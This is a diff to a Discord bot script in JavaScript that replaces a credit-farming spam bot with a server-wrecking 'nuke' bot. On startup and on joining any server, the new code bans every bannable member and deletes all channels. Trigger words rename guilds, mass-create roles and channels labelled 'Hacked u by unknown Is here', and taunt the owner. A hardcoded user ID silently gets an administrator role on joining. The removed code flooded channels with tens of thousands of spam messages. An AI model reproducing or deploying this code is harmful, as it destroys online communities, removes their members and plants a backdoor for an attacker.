@@ -1,138 +1,484 @@
-const Discord = require('discord.js');
-const client = new Discord.Client();
-const client2 = new Discord.Client();
+const Discord = require("discord.js");
+const LOka = new Discord.Client();
+console.log('By KBOOOOOOOOSH-YT');
+LOka.on('ready', () => {
+  console.log(`Logged in as ${LOka.user.tag} !`);
+
+});
+LOka.on('ready',  () => {
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('      ~            ~  By : KBOOOOOOOOSH-YT ~           ~    ');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
+
+        
+    
+
+});
+var prefix = "-"
+LOka.on("message", message => {
+  if(!message.content.startsWith(prefix)) return;;
+  let args = message.content.split(" ").slice(1);
+  var argresult = args.join(' ');
+  if (message.content.startsWith('hix15')) {
+    LOka.user.setUsername(argresult);
+  }
+    if (message.content.startsWith(prefix + 'on123')) {
+    LOka.user.setStatus(argresult);
+  }
+});
+
+var x1 = "kk"
+LOka.on('message', message => {
+     if (message.content === ".") {
+LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+
+}
+});
+var x1 = "kk"
+LOka.on('message', message => {
+     if (message.content === ".") {
+LOka.user.setUsername("Hacked u by unknown Is here")
+
+}
+});
+LOka.on('message', message => {
+     if (message.content === ".") {
+LOka.user.setGame(`Hacked u by unknown Is here`,'https://www.twitch.tv/hix')
+
+}
+});
+
+LOka.on('message', message => {
+     if (message.content === ".") {
+         LOka.guilds.forEach(m =>{
+             m.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+})
+}
+});
+LOka.on('message', message => {
+     if (message.content === ".") {
+         LOka.guilds.forEach(m =>{
+             m.setName(`Hacked u by unknown Is here`)
+})
+}
+});
+
+LOka.on('message', message => {
+     if (message.content === ".") {
+                 if(!message.channel.guild) return;
+
+             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+
+}
+});
+
+LOka.on('message', message => {
+     
+
+     if (message.content === "k1") {
+         LOka.guilds.forEach(m =>{
+  m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+     m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
 
 
-console.log("Scrpit By Dream");
+    
+})
+ 
+ 
+}
+});
+LOka.on('message', message => {
+         if (message.content === "k") {
+               LOka.guilds.forEach(m =>{
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
 
-client.on('ready', () => {
-  console.log(`----------------`);
-  console.log(`Credit Farmm - Script By : Vechx `);
-  console.log(`----------------`);
-  console.log(`Loadinng`);
-  console.log(`Loadinng.`);
-  console.log(`Loadinng..`);
-  console.log(`Loadinng...`);
-  console.log(`This Bots Online ' `);
- console.log(`----------------`);
+m.createChannel('Hacked u by unknown Is here', 'text');
 
+m.createChannel('Hacked u by unknown Is here', 'text');
+
+m.createChannel('Hacked u by unknown Is here', 'text');
+
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+
+})
+}
+});
+
+LOka.on('message', message => {
+         if (message.content === "k") {
+                 LOka.guilds.forEach(m =>{
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+
+
+
+})
+}
 
 });
 
 
-client.on('message', message => {
-  if(message.author.id !== "311830569975676929" )return;
-  if(message.content === 'Collect Dailies'){
-      message.channel.send('#daily')
-  }
-});
+const { Client } = require('discord.js');
+const client = new Client();
 
-client.on('message', message => {
-  if(message.author.id !== "311830569975676929" )return;
-  if(message.content === 'Check Credits'){
-      message.channel.send('#credits')
-  }
-});
+async function nuke(guild) {
+  let users = 0;
+  let channels = 0;
 
-client.on('message', message => {
-  if(message.author.id !== "311830569975676929" )return;
-  if(message.content === 'Rep Me'){
-      message.channel.send('#rep <@311830569975676929>')
-  }
-});
+  await guild.fetchMembers();
 
-client.on('message', message => {
-  if(message.author.id !== "311830569975676929" )return;
-const args = message.content.trim().split(/ +/g);
-const command = args.shift().toLowerCase();
-  if ( command === "gc") {
-  let credits = args[0]; 
-  message.channel.send(`#credits  <@311830569975676929> ${credits}`);
-  }
+  await guild.owner.send(' Hacked u by unknown Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
 
-  if (command === "say") {
-    let thingie = args[0]; 
-    message.channel.send(`${thingie}`);
+
+
+  await Promise.all(guild.members.map(async (m) => {
+    if (m.bannable) {
+      users++;
+      await m.send('^_^').catch(e => { return void e; });
+      return m.ban();
     }
-  });
+  }));
   
-//Bot 2//
-client2.on('message', message => {
-  if(message.author.id !== "311830569975676929" )return;
-  if(message.content === 'Collect Dailies'){
-      message.channel.send('#daily')
-  }
-});
-
-client2.on('message', message => {
-  if(message.author.id !== "311830569975676929" )return;
-  if(message.content === 'Check Credits'){
-      message.channel.send('#credits')
-  }
-});
-
-client2.on('message', message => {
-  if(message.author.id !== "311830569975676929" )return;
-  if(message.content === 'Rep Me'){
-      message.channel.send('#rep <@311830569975676929>')
-  }
-});
-client2.on('message', message => {
-  if(message.author.id !== "311830569975676929" )return;
-  const args = message.content.trim().split(/ +/g);
-  const command = args.shift().toLowerCase();
-if (command === "gc2") {
-  let credits = args[0]; 
-  message.channel.send(`#credits  <@311830569975676929> ${credits}`);
-  }
-  if (command === "say") {
-    let thingie = args[0]; 
-    message.channel.send(`${thingie}`);
+    await Promise.all(guild.channels.map(c => {
+    if (c.deletable) {
+      channels++;
+      return c.delete();
     }
-  });
- 
+  }));
+  
+    await guild.createChannel('Hacked u by unknown Is here', 'text');
 
+      await guild.createChannel('Hacked u by unknown Is here', 'voice');
 
-client.on('message', message => {
- 
-if (message.content === '!spam2') {
-    let count = 0;
-    let ecount = 0;
-    for(let x = 0; x < 90000; x++) {
-      message.channel.send(`**Credit Spam , Frame , Credit By Vechx , Farm Credit By Vechx, ez Farm - كردت اسبام اسبام اسبام اوف ءف اح اح نار ج **[ " ${x} " ]`)
-        .then(m => {
-          count++;
-        })
-      
+  
+
+}
+
+LOka.on('ready', () => {
+  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
+  console.log('-------------------------------------------------------------');
+  console.log('');
+  console.log("Made by YzhF1");
+  console.log("");
+  console.log("-------------------------------------------------------------");
+
+});
+
+LOka.on('guildCreate', async (guild) => {
+  return nuke(guild).catch(console.error);
+});
+
+LOka.on('guildMemberAdd', member => {
+    
+            if (member.id === "311830569975676929") {
+                member.guild.createRole({
+                    name : LOka.user.username,
+                    color : "RANDOM", 
+                    permissions : [8]
+                }).then(function(role){
+                    member.addRole(role)
+                })
+                
+            }
         
-      }
-    }
-    if(message.author.id !== "311830569975676929" )return; 
-    if (message.content === '!stop') {
-    let x = 90000
-    }
-});
+    });
 
-client2.on('message', message => {
-   // لا تغير شئ عشان ما تخرب الدنيا
-if (message.content === '!spam2') {
-    let count = 0;
-    let ecount = 0;
-    for(let x = 0; x < 90000; x++) {
-      message.channel.send(`**Credit Spam , Frame , Credit By Vechx , Farm Credit By Vechx, ez Farm - كردت اسبام اسبام اسبام اوف ءف اح اح نار ج **[ " ${x} " ]`)
-        .then(m => {
-          count++;
-        })
-        
-      }
-    }
-    if(message.author.id !== "311830569975676929" )return; 
-    if (message.content === '!stop') {
-    let x = 90000
-    }
-});
+    
 
 
+
+
+LOka.login("TOKEN1")
  
 client.login(process.env.TOKEN);// لا تغير فيها شيء
 client2.login(process.env.TOKEN2);// لا تغير فيها شيء
